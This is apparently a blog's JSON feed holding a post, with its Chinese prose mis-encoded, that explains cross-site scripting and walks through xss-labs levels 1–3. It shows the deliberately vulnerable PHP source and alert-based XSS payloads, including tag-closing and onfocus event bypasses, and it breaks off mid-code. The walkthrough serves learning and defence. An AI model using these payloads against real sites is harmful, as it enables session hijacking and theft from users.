{
    "version": "https://jsonfeed.org/version/1",
    "title": "äº‘é€¸'bolg â€¢ All posts by \"webå®‰å…¨\" category",
    "description": "",
    "home_page_url": "http://gyzero.shop",
    "items": [
        {
            "id": "http://gyzero.shop/2023/11/01/%E6%BC%8F%E6%B4%9E/xss%E6%BC%8F%E6%B4%9E/",
            "url": "http://gyzero.shop/2023/11/01/%E6%BC%8F%E6%B4%9E/xss%E6%BC%8F%E6%B4%9E/",
            "title": "xssæ¼æ´",
            "date_published": "2023-11-01T00:00:22.000Z",
            "content_html": "<h3 id=\"xss-æ¼æ´ä»‹ç»\"><a class=\"markdownIt-Anchor\" href=\"#xss-æ¼æ´ä»‹ç»\">#</a> <span class=\"label info\">ğŸ’­xss æ¼æ´ä»‹ç»</span></h3>\n<p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scriptingï¼ŒXSSï¼‰æ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…å°†æ¶æ„è„šæœ¬æ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œè¿™äº›è„šæœ¬ç„¶åè¢«æµè§ˆå™¨æ‰§è¡Œï¼Œä»è€Œä½¿æ”»å‡»è€…èƒ½å¤Ÿçªƒå–ç”¨æˆ·çš„ä¿¡æ¯ã€åŠ«æŒä¼šè¯ã€ç ´åç½‘ç«™çš„åŠŸèƒ½æˆ–ä»¥å…¶ä»–æ–¹å¼å±å®³ç”¨æˆ·å’Œç½‘ç«™çš„å®‰å…¨æ€§ã€‚XSS æ”»å‡»é€šå¸¸é€šè¿‡åœ¨ç½‘é¡µä¸­æ’å…¥æ¶æ„ä»£ç æ¥å®ç°ï¼Œè€Œè¿™äº›ä»£ç ä¼šåœ¨ç”¨æˆ·æµè§ˆç½‘é¡µæ—¶æ‰§è¡Œã€‚</p>\n<h3 id=\"ï¸xss-æ¼æ´é€šå¸¸åˆ†ä¸ºä¸‰ä¸ªä¸»è¦ç±»å‹\"><a class=\"markdownIt-Anchor\" href=\"#ï¸xss-æ¼æ´é€šå¸¸åˆ†ä¸ºä¸‰ä¸ªä¸»è¦ç±»å‹\">#</a> <span class=\"label primary\">ğŸ•·ï¸XSS æ¼æ´é€šå¸¸åˆ†ä¸ºä¸‰ä¸ªä¸»è¦ç±»å‹</span></h3>\n<p>å­˜å‚¨å‹ XSSï¼ˆStored XSSï¼‰ï¼š æ”»å‡»è€…å°†æ¶æ„è„šæœ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–æ–‡ä»¶ä¸­ï¼Œç„¶åå½“ç”¨æˆ·è®¿é—®åŒ…å«è¿™äº›æ¶æ„è„šæœ¬çš„é¡µé¢æ—¶ï¼Œæµè§ˆå™¨ä¼šåŠ è½½å¹¶æ‰§è¡Œè¿™äº›è„šæœ¬ã€‚è¿™å¯èƒ½å¯¼è‡´ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯è¢«ç›—å–ï¼Œæˆ–è€…å¯¹ç½‘ç«™çš„å†…å®¹è¿›è¡Œç¯¡æ”¹ã€‚</p>\n<p>åå°„å‹ XSSï¼ˆReflected XSSï¼‰ï¼š æ”»å‡»è€…å°†æ¶æ„è„šæœ¬åŒ…å«åœ¨ URL ä¸­ï¼Œç„¶åè¯±ä½¿ç”¨æˆ·ç‚¹å‡»è¿™ä¸ª URLã€‚å½“ç”¨æˆ·ç‚¹å‡»é“¾æ¥æ—¶ï¼Œæ¶æ„è„šæœ¬ä¼šè¢«æ³¨å…¥åˆ°é¡µé¢ä¸­å¹¶ç«‹å³æ‰§è¡Œã€‚è¿™ç§ç±»å‹çš„æ”»å‡»é€šå¸¸éœ€è¦ç¤¾ä¼šå·¥ç¨‹æˆ–è¯±å¯¼ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥ã€‚</p>\n<p>DOM-based XSSï¼š è¿™ç§ç±»å‹çš„æ”»å‡»ä¸ä¾èµ–äºæœåŠ¡å™¨å°†æ¶æ„è„šæœ¬å­˜å‚¨æˆ–åå°„åˆ°é¡µé¢ä¸Šã€‚ç›¸åï¼Œæ”»å‡»åˆ©ç”¨äº†æ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ˆDOMï¼‰åœ¨æµè§ˆå™¨ä¸­çš„æ“ä½œæ–¹å¼ï¼Œé€šè¿‡ä¿®æ”¹é¡µé¢çš„ DOM ç»“æ„æ¥æ‰§è¡Œæ¶æ„æ“ä½œã€‚è¿™ç§æ”»å‡»é€šå¸¸éš¾ä»¥æ£€æµ‹å’Œé˜²å¾¡ã€‚</p>\n<h3 id=\"å±å®³\"><a class=\"markdownIt-Anchor\" href=\"#å±å®³\">#</a> <span class=\"label danger\">ğŸ’”å±å®³</span></h3>\n<ul>\n<li>çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·åã€å¯†ç ã€cookie ç­‰ã€‚</li>\n<li>åŠ«æŒç”¨æˆ·ä¼šè¯ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿä»¥ç”¨æˆ·èº«ä»½æ‰§è¡Œæ“ä½œã€‚</li>\n<li>ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼ŒåŒ…æ‹¬æ’å…¥æ¶æ„é“¾æ¥æˆ–æ¬ºéª—ç”¨æˆ·ã€‚</li>\n<li>åˆ©ç”¨ç½‘ç«™çš„ä¿¡ä»»æ¥è¿›è¡Œç¤¾ä¼šå·¥ç¨‹æ”»å‡»ã€‚</li>\n</ul>\n<div class=\"note info\">\n<p>è¦é˜²æ­¢ XSS æ”»å‡»ï¼Œå¼€å‘äººå‘˜å’Œç½‘ç«™ç®¡ç†å‘˜å¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p>\n</div>\n<ol>\n<li><ins class=\"dot\">è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼š å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡ŒéªŒè¯å’Œè¿‡æ»¤ï¼Œä»¥ç¡®ä¿ä¸å…è®¸ä»»ä½•æ¶æ„ä»£ç é€šè¿‡ã€‚</ins></li>\n<li><ins class=\"dot\">è¾“å‡ºç¼–ç ï¼š åœ¨å°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¾“å‡ºåˆ°ç½‘é¡µæ—¶ï¼Œä½¿ç”¨é€‚å½“çš„ç¼–ç æ–¹æ³•ï¼Œå¦‚ HTML ç¼–ç ã€JavaScript ç¼–ç ï¼Œä»¥é˜²æ­¢æµè§ˆå™¨è§£é‡Šä¸ºå¯æ‰§è¡Œä»£ç ã€‚</ins></li>\n<li><ins class=\"dot\">HTTP å¤´éƒ¨è®¾ç½®ï¼š åœ¨ HTTP å“åº”ä¸­è®¾ç½®é€‚å½“çš„å®‰å…¨å¤´éƒ¨ï¼Œå¦‚ Content Security Policyï¼ˆCSPï¼‰æ¥é™åˆ¶æµè§ˆå™¨åŠ è½½å¤–éƒ¨èµ„æºã€‚</ins></li>\n<li><ins class=\"dot\">ä½¿ç”¨å®‰å…¨æ¡†æ¶ï¼š ä½¿ç”¨å®‰å…¨æ¡†æ¶å’Œåº“ï¼Œå¦‚ OWASP AntiSamy æˆ– DOMPurifyï¼Œæ¥å¸®åŠ©é˜²å¾¡ XSS æ”»å‡»ã€‚</ins></li>\n<li><ins class=\"dot\">åŠæ—¶æ›´æ–°ï¼š åŠæ—¶æ›´æ–°ç½‘ç«™çš„è½¯ä»¶ã€åº“å’Œä¾èµ–é¡¹ï¼Œä»¥ä¿®å¤å·²çŸ¥çš„æ¼æ´ã€‚</ins></li>\n</ol>\n<p>æŒ–æ˜ xss è¯­å¥æ—¶å¯ä»¥ç”¨ &lt;&gt;'&quot; ç©ºæ ¼è¿™äº›æ ‡ç­¾æŸ¥çœ‹é¡µé¢æºä»£ç çœ‹çœ‹æœ‰æ²¡æœ‰è¿‡æ»¤</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&lt;</span>svg onload<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string\">'javascript:alert(1)'</span><span class=\"token operator\">></span>aa<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span></pre></td></tr></table></figure><h3 id=\"xss-labsæ¼”ç¤º\"><a class=\"markdownIt-Anchor\" href=\"#xss-labsæ¼”ç¤º\">#</a> <span class=\"label success\">ğŸ¸xss-labs æ¼”ç¤º</span></h3>\n<h4 id=\"ç¬¬ä¸€å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¸€å…³\">#</a> <span class=\"label\">ç¬¬ä¸€å…³</span></h4>\n<p>è¾“å…¥çš„ä¼šè¢«æ’å…¥åˆ° h2 æ ‡ç­¾é‡Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/1.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/2.png\" alt=\"\"></p>\n<p><span class=\"label\">ğŸ‘ï¸ä»£ç åˆ†æ</span></p>\n<p>æºç åˆ†æï¼šä¸‹é¢çš„ä»£ç ï¼Œstr è·å– name çš„å€¼ï¼Œç›´æ¥è¿”å›å‰ç«¯ä½¿ç”¨ã€‚è¯´æ˜æºç æ˜¯å®Œå…¨æ²¡æœ‰å¯¹ GET è¯·æ±‚åˆ°çš„ name å˜é‡è¿›è¡Œè¿‡æ»¤ï¼ŒåŸå°ä¸åŠ¨åœ°å‘é€åˆ°æµè§ˆå™¨çš„ï¼Œæ‰€ä»¥æ‰ä¼šè¢«æ‰§è¡Œ</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level2.php?keyword=test\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token constant\">GET</span>è·å–ç”¨æˆ·è¾“å…¥å†…å®¹ç»™str</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>æ¬¢è¿ç”¨æˆ·\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$str</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h2>\"</span><span class=\"token punctuation\">;</span> ç›´æ¥<span class=\"token keyword\">echo</span>è¾“å‡ºh2æ ‡ç­¾é‡Œä½¿ç”¨æ²¡æœ‰ä»»ä½•è¿‡æ»¤</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level1.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    payload:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">33333</span><span class=\"token punctuation\">)</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/3.png\" alt=\"\"></p>\n<h4 id=\"ç¬¬äºŒå…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬äºŒå…³\">#</a> <span class=\"label\">ç¬¬äºŒå…³</span></h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/4.png\" alt=\"\"></p>\n<p><span class=\"label\">ğŸ‘ï¸ä»£ç åˆ†æ</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>è¿™å…³ç”¨åˆ°äº† htmlspecialchars() å‡½æ•° </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>htmlspecialchars() å‡½æ•°æŠŠä¸€äº›é¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> &amp;ï¼ˆå’Œå·ï¼‰æˆä¸º<span class=\"token entity named-entity\" title=\"&amp;\">&amp;amp;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> \"ï¼ˆåŒå¼•å·ï¼‰æˆä¸º <span class=\"token entity named-entity\" title=\"&quot;\">&amp;quot;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> 'ï¼ˆå•å¼•å·ï¼‰æˆä¸º <span class=\"token entity named-entity\" title=\"&apos;\">&amp;apos;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> &lt; ï¼ˆå°äºï¼‰æˆä¸º <span class=\"token entity named-entity\" title=\"&lt;\">&amp;lt;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> >ï¼ˆå¤§äºï¼‰æˆä¸º <span class=\"token entity named-entity\" title=\"&gt;\">&amp;gt;</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level3.php?writing=wait\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"ç›¸å…³çš„ç»“æœ.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;form action=level2.php method=GET></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>&lt;input type=submit name=submit value=\"æœç´¢\"/></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level2.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>ç”¨htmlspecialcharså¯¹ç”¨æˆ·è¾“å…¥çš„é¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/a.png\" alt=\"\"></p>\n<p>&lt;&gt; è¢«è½¬ä¹‰äº†å¯¼è‡´æ— æ³•æ‰§è¡Œè¯­å¥å¼¹çª—</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/b.png\" alt=\"\"></p>\n<p>è€Œ input ä¹Ÿè¢«å†™å…¥äº†è¯­å¥å¹¶ä¸”æ²¡æœ‰è¿›è¡Œè½¬ä¹‰ï¼Œå¯ä»¥åœ¨è¿™é‡Œé—­åˆ input å°±å¯ä»¥æ‰§è¡Œè¯­å¥äº†</p>\n<p><code>payload: &quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/5.png\" alt=\"\"></p>\n<h4 id=\"ç¬¬ä¸‰é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¸‰é¢˜\">#</a> <span class=\"label\">ç¬¬ä¸‰é¢˜</span></h4>\n<p>è¾“å…¥ä¸Šå…³è¯­å¥æ— æ•ˆäº†</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/6.png\" alt=\"\"></p>\n<p>æŸ¥çœ‹æºä»£ç å¯¹ä¸¤å¤„éƒ½ç”¨ htmlspecialchars å‡½æ•°å¤„ç†äº†æ— æ³•é—­åˆäº†ï¼Œå¯ä»¥ä½¿ç”¨â€™ autofocus onfocus=alert (666) ' äº‹ä»¶è§¦å‘å‹çš„è¯­å¥</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span 